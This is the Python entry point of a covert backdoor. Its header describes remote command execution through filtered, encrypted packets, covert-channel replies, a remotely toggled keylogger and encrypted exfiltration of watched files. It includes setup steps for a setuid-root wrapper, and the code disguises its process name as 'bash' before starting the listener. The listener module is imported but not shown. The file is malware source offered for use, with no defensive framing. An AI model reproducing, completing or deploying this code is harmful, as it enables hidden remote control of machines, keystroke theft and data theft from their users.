#!/bin/env python
from bdlisten import Listener
import procname
import ConfigParser
"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
''' Backdoor program that can allow a remote attacker to execute arbitrary commands on the target machine. 
''' Uses libpcap via Scapy to listen for packets directly on the NIC for either tcp or udp packets (user-
''' specified). Incoming packets are further filtered by source and destination ports and remote IP, as
''' specified by the user. After packets make it through the filter, they are checked again to ensure that
''' the payload of the packet contains an encrypted signature, indicating a command from the remote host. 
''' Packets that don't contain the password are discarded. Commands received in verified packets are 
''' executed in a subprocess and the response from the system is sent back to the remote host.
''' 
''' All control commands from the client to backdoor are encrypted using AES encryption, with a key
''' password specified by the user. The key given at the backdoor must match the one given at the client.
'''
''' All command responses from the backdoor to client are sent over a covert channel.
'''
''' The backdoor also contains a keylogger that can be toggled on or off remotely by the client. Recorded
''' keystrokes are returned to the client over a covert channel (separate from the response channel) to be
''' logged.
'''
''' File Watches can be added by the client. If a specified file is created or modified, it is exfiltrated,
''' encrypted, to the client over a standard TCP connection.
'''
''' To run:
'''     The program can optionally be run with the help of wrapper.c, which enables setting the userid
'''     of the running process. This should be used if the program will be run by a user other than root.
'''
'''     The wrapper can be compiled with:
'''         gcc -o wrapper wrapper.c
'''     The following commands must also be run on the wrapper:
'''         chown root wrapper
'''         chmod u+s wrapper
'''     Then:
'''         ./wrapper bdoor.py
'''     
'''     If the program is run without the wrapper:
'''         ./bdoor.py
'''
'''
''' Authors:  Wilson Carpenter
'''           Robert Purdey
''' Version: 2.0
''' Date: December 10, 2017
'''
"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""

def main():
    """
    Entry point for the backdoor program.
    :return:
    """
    # os.setuid(0)
    # os.seteuid(0)

    config = ConfigParser.ConfigParser()
    config.read('./bd.config')

    # initial setup stuff
    remote_host = config.get('Setup', 'rhost')
    local_host = config.get('Setup', 'lhost')
    source_port = config.get('Setup', 'sport')
    dest_port = config.get('Setup', 'dport')
    protocol = config.get('Setup', 'proto')
    encryption_key = config.get('Setup', 'enkey')

    # initial watches
    watches = config.get('Watches', 'paths').split(',')

    # hide the process name
    procname.setprocname('bash')

    listener = Listener(remote_host, local_host, source_port, dest_port,
                        protocol, encryption_key, watches)

    try:
        listener.listen()
    except KeyboardInterrupt:
        pass


if __name__ == '__main__':
    main()
